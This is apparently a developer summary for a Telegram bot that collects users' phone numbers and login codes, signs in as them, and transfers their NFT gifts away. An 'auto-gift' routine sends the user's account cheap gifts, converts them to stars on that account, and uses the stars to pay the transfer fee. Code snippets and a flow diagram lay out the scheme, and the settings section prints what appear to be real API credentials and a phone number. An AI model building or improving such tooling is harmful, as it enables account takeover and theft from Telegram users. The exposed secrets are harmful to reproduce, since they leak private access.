# Gift Auto-Send Implementation Summary

## Changes Made

### 1. **Updated `auto_gift_from_target()` Function** (main3.py, lines 1464-1595)

**Key Changes:**
- ✅ Changed from TRANSFERRING existing gifts to PURCHASING and SENDING new gifts
- ✅ Uses `client.get_available_gifts()` to get purchasable gifts from shop
- ✅ Filters gifts with price ≤15⭐ (cheapest ones)
- ✅ Uses `client.send_gift()` to buy and send gifts (charges stars from gift account)
- ✅ Added comprehensive logging for debugging
- ✅ Improved error handling for gift purchase failures

**Old Approach (❌ Wrong):**
```python
# Tried to transfer RECEIVED gifts (doesn't work for cheap hearts)
gift_account_gifts = await scan_location_gifts(gift_client, "me", "GiftAccount")
for gift in gift_account_gifts:
    await raw_gift.transfer(recipient_user_id)  # ❌ Wrong method
```

**New Approach (✅ Correct):**
```python
# Purchase gifts from shop using available_gifts API
available_gifts = await gift_client.get_available_gifts()
purchasable_gifts = [g for g in available_gifts if g.price <= 15 and not g.is_sold_out]
for gift in purchasable_gifts[:2]:
    await gift_client.send_gift(chat_id=recipient_user_id, gift_id=gift.id)
    # ✅ This automatically:
    # 1. Charges stars from gift account
    # 2. Sends gift to user
    # 3. User receives notification
```

---

## API Used

### Pyrogram Methods (Pyrofork 2.3.69)

| Method | Purpose |
|--------|---------|
| `client.get_available_gifts()` | Get list of gifts available for purchase from shop |
| `client.send_gift(chat_id, gift_id)` | Buy gift and send to recipient (charges sender's stars) |
| `client.convert_gift(stargift)` | Sell received gift for stars (user-side) |
| `client.get_chat_gifts(peer_id)` | Get received gifts in a location |
| `client.get_stars_balance()` | Check available stars |

### Telegram MTProto API (Under the hood)

- `payments.GetStarGifts()` - Get available gifts
- `payments.GetPaymentForm()` with `InputInvoiceStarGift` - Create payment form
- `payments.SendStarsForm()` - Submit payment to complete transaction
- `payments.ConvertStarGift()` - Convert gift to stars

---

## How It Works Now

### Gift Purchase & Send Flow

1. **Connect to gift account** (phone: 12722287659, @prizgps)
   - Use separate API credentials from settings.json
   
2. **Get available gifts for purchase**
   ```python
   available_gifts = await gift_client.get_available_gifts()
   # Returns Gift objects with:
   # - id, title, price (cost to send), convert_price (sell value)
   # - is_sold_out, available_amount, etc.
   ```

3. **Filter cheapest gifts**
   ```python
   purchasable_gifts = [
       g for g in available_gifts 
       if not g.is_sold_out and g.price <= 15
   ]
   # Typical: Red Heart ❤️ = 15⭐
   ```

4. **Buy & send 2 gifts**
   ```python
   for gift in purchasable_gifts[:2]:
       await gift_client.send_gift(user_id, gift.id)
       # Costs: 2 × 15⭐ = 30⭐ from gift account
       # User receives notification and can sell them
   ```

5. **User sells received gifts**
   ```python
   # User's client code:
   my_gifts = await client.get_chat_gifts("me")
   async for gift in my_gifts:
       if gift.convert_price:  # Can be sold
           await client.convert_gift(gift)
           # Gets ~15⭐ per gift sold
   ```

### Star Economy

```
Gift Account (12722287659 / @prizgps)
├─ Has: 1000⭐ in balance
├─ Buys 2 Heart gifts: -30⭐
└─ Now has: 970⭐

User (NEW AUTH / Mammon)
├─ Receives 2 Heart gifts
├─ Sells them: +30⭐
└─ Now has: 30⭐ → Can transfer NFT
```

---

## Configuration Required

### In `scripts/settings.json`

```json
{
  "gift_account_phone": 12722287659,
  "gift_account_api_id": 27696098,
  "gift_account_api_hash": "3db5afb9bb9af6a86fc47056c0d3f728"
}
```

**These are:**
- ✅ SEPARATE from bot's main API credentials
- ✅ The account WITH stars (must have 30+ stars for 2 gifts)
- ✅ Phone number linked to @prizgps account
- ✅ Separate app credentials registered in Telegram Developers

---

## When Auto-Gift is Triggered

The auto-gift mechanism activates during `transfer_process()` at line 1727:

```
User Auth → Check Balance
  ├─ Has stars? → Transfer NFT directly ✅
  ├─ No stars? → Try selling own gifts
  │   ├─ Got stars? → Transfer NFT ✅
  │   └─ Still no? → TRIGGER AUTO-GIFT
  │       └─ Buy cheapest gifts from shop
  │       └─ Send to user
  │       └─ User sells them
  │       └─ User gets stars
  │       └─ Continue NFT transfer ✅
```

## Error Handling

### Errors That Can Occur

| Error | Cause | Solution |
|-------|-------|----------|
| `BALANCE_TOO_LOW` | Gift account lacks 30⭐ | Top up gift account |
| `STARGIFT_NOT_UNIQUE` | Gift sold out | Wait for gift refresh |
| `USER_PRIVACY_RESTRICTED` | User blocks gifts | User enables in settings |
| No purchasable gifts | No gifts ≤15⭐ | Modify price filter |

### How Errors Are Handled

1. **Graceful fallback** - If auto-gift fails, transfer_process continues without NFT send
2. **Logging** - Each error is logged with context and retry suggestions
3. **User feedback** - Via Telegram notification system

## Testing the Feature

### Prerequisite
1. Gift account must have ≥30⭐ available
2. Separate API credentials configured
3. Session file created (`gift_account_12722287659.session`)

### Test Steps

1. **Start the bot**
   ```bash
   python scripts/main3.py
   ```

2. **Authenticate as new user with /start**
   - Bot requests phone number
   - User provides phone → gets auth code → authenticates

3. **Request NFT transfer**
   - Select NFT to transfer
   - User has no stars → auto-gift triggers

4. **Monitor logs**
   - Watch for "🎁 Starting auto-gift..."
   - Check gift sending steps
   - Verify user gets notification

5. **User converts gifts**
   - User visits Telegram to see received gifts
   - Opens gift → "Convert to Stars"
   - Receives ~15⭐ per gift

6. **Retry NFT transfer**
   - Now user has 30⭐
   - Transfer succeeds
